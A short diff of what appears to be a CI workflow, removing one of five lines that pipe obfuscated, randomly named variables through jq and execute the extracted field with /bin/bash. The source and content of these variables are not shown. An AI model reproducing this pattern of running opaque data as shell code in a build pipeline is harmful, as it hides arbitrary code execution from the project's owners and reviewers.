@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$i7714" | jq -r .l24229 | /bin/bash
           echo $uw72065 | jq -r .zjzyh300 | /bin/bash
           printf '%s' "$sf69790" | jq -r .o6478 | /bin/bash
-          echo $pn55 | jq -r .gcpey36 | /bin/bash
           echo $itplw64 | jq -r .v725 | /bin/bash
 
       - name: Persist output
